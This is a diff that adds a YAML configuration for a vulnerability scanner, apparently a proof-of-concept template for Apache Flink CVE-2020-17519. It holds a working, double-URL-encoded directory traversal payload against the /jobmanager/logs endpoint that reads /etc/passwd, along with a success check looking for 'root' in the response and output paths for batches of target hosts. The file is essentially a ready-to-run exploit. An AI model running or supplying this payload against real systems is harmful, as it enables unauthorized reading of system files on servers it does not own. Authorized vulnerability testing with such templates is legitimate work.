@@ -1,0 +1,15 @@
+targetPath: /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+targetMethod: get
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:7890
+targetAllowRedirects: false
+targetHeaders:
+targetJson:
+targetData:
+targetReExpression:
+    respStatusCode: 200
+    respBody: root
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/flink_Cve_2020_17519目录遍历/
+targetRestText: True
